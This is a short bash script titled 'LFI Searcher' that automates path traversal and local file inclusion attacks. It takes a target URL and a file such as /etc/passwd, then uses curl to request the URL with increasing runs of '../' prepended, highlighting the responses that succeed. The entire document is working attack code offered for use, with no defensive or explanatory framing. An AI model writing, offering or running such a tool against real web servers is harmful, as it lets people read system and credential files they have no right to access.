#!/bin/bash

# Default number of attempts
attempts=10

# Define some color and style codes
bold=$(tput bold)
normal=$(tput sgr0)
red=$(tput setaf 1)
green=$(tput setaf 2)

# Help text
help_text="
LFI Searcher - By Jtgit4

Options:
  -u, --url       target URL        Example: http://google.com/parameter?search=
  -f, --file      target file       Example: /etc/passwd
  -a, --attempts  number of attempts (default: 10)         
  -h, --help      display help text
"

# Parse command line options

while (( "$#" )); do
  case "$1" in
    -u|--url)
      base_url="$2"
      shift 2
      ;;
    -f|--file)
      target_file="$2"
      shift 2
      ;;
    -a|--attempts)
      attempts="$2"
      shift 2
      ;;
    -h|--help)
      echo "$help_text"
      exit 0
      ;;
    *)
      echo "Error: Invalid argument"
      echo "$help_text"
      exit 1
      ;;
  esac
done

# Print the initial script information
echo "====================================="
echo "LFI Searcher - By Jtgit4"
echo "Target URL: $base_url"
echo "Target File: $target_file"
echo "Attempts: $attempts"
echo "====================================="
echo "Searching:"
echo

for i in $(seq 1 $attempts); do
  relative_path=$(printf '../%.0s' $(seq 1 $i))
  url="${base_url}${relative_path}${target_file}"
  result=$(/usr/bin/curl -s -S "$url" 2>&1)  # Using -s to silent progress meter, -S to show errors, and 2>&1 to redirect STDERR to STDOUT

  # Determine result color
  if [[ "$result" =~ "No such file" ]] || [[ "$result" =~ "No Result" ]]; then
    result_color="$red"
  elif [[ "$result" =~ "curl:" ]]; then
    result_color="$red"
  else
    result_color="$green"
  fi

  # Print the attempt number and result
  echo -e "====================================="
  echo -e "Attempt: ${bold}${i}${normal} ==> ${relative_path}${target_file}\n"
  echo -e "Result:\n\n${result_color}${result}${normal}\n"

  sleep 1 # Delay for 1 second
done
